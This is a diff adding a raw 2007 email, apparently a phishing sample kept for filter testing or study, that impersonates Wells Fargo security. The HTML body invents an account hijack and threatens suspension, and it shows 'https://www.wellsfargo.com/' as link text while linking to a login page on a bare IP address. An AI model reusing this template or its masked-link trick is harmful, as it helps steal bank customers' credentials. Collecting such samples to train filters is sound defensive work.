@@ -1,0 +1,109 @@
+From nobody Sun Jan 25 13:49:57 2015
+Return-Path: <security@wellsfargo.com>
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.6.4])
+ by example.com (Postfix) with ESMTP id 777162A69F
+ for <user@example.com>; Tue, 27 Feb 2007 09:34:36 -0500 (EST)
+Received: from mail.example.com (mail.example.com [192.168.1.2])
+ by mail.example.com (Example mail relay) with ESMTP id 001D4621E1D
+ for <user@example.com>; Tue, 27 Feb 2007 09:34:34 -0500 (EST)
+Received: by mail.example.com (Example mail relay)
+ id 1E3AD16515; Tue, 27 Feb 2007 09:39:02 -0500 (EST)
+Delivered-To: user@example.com
+Received: from nlpi043.sbcis.sbc.com (nlpi043.sbcis.sbc.com [207.115.36.72])
+ by mail.example.com (Example mail relay) with ESMTP id 051A116513
+ for <user@example.com>; Tue, 27 Feb 2007 09:39:01 -0500 (EST)
+X-ORBL: [75.28.30.155]
+Received: from fsfdsd (adsl-75-28-30-155.dsl.irvnca.sbcglobal.net
+ [75.28.30.155])
+ by nlpi043.sbcis.sbc.com (8.13.8 out.dk.spool/8.13.8) with SMTP id
+ l1REXjvP021389; Tue, 27 Feb 2007 08:33:45 -0600
+Message-Id: <200702271433.l1REXjvP021389@nlpi043.sbcis.sbc.com>
+From: "Wells Fargo" <security@wellsfargo.com>
+Subject: IMPORTANT : Security Measures Notification of Limited Account Access
+Date: Tue, 27 Feb 2007 06:32:57 -0800
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="Windows-1251"
+Content-Transfer-Encoding: 7bit
+X-Priority: 3
+X-MSMail-Priority: Normal
+X-Mailer: Microsoft Outlook Express 6.00.2600.0000
+X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2600.0000
+To: undisclosed-recipients: ;
+X-Keywords: 
+Status: RO
+Content-Length: 2914
+Lines: 71
+
+<html>
+
+<body>
+
+<table border="1" width="62%"
+        <tr>
+                <td>
+                <p align="center">
+                </p>
+                <p align="left">
+                <img border="0" src="https://a248.e.akamai.net/7/248/1856/90m/www.wellsfargo.com/img/business/homepage/ind_homelogo_gen.gif" 
+align="right" width="238" height="67"><b><font face="Arial" size="2">Dear Wells Fargo
+                valued customer,</font></b><br>
+                <br><br>
+                 <br>
+
+                <font face="Arial" size="2">
+
+During our regularly schedule account maintenance and verification we have detected a slight error in your billing information on file with Wells Fargo.<br> This might be due to either following reasons:
+<br> 
+<br><strong><FONT color=red>- A recent change in your personal information (i.e. change of address)</FONT>
+<br><FONT color=red>- An inability to accurately verify your selected option of payment due an internal error within
+our processors.</FONT></strong>
+<br>
+ <br>We recently noticed one or more attempts to log in your
+				Wells Fargo account from a foreign IP address and we have
+reasons to believe
+                that your account was hijacked by a third party without
+your
+                authorization. If you recently accessed your account while 
+                traveling, the log
+                in attempts may have initiated by you.<br>
+                <br>
+                However if you are the rightful holder of the account, click on 
+                the link below and submit, as we try to verify your account.
+                </font><br>
+                <br>
+<a target="_blank" href="http://75.179.17.139/icons/secure/secure/online/ssl_encrypt/login/index.php">
+				https://www.wellsfargo.com/</a><br>
+                <br>
+                <font face="Arial" size="2">The log in attempt was made from:<br>
+                <br>
+                IP address: <b>211.72.153.170</b><br>
+                ISP host: <b>211.72.153.170-mail.tw</b><br>
+                <br>
+                If you choose to ignore our request, you leave us no
+choice but to
+                temporally suspend your account.<br>
+                We ask that you allow at least 72hrs for the case to be
+investigated and
+                we strongly recommend not making any changes to your
+account in that
+                time.<br>
+                <br>
+<font color="#808080">* Please do not respond to this
+email as your
+                reply will not be received.</font><br>
+                <br>
+                Thank you for your patience as we work together to protect
+your account.</font><p align="left">
+                &nbsp;</td>
+        </tr>
+        <tr>
+                <td>
+                <p align="center"><b><font face="Verdana" size="2">Copyright © 
+                1999-2007 Wells Fargo. All rights reserved.</font></b></td>
+        </tr>
+</table>
+
+</body>
+</html>
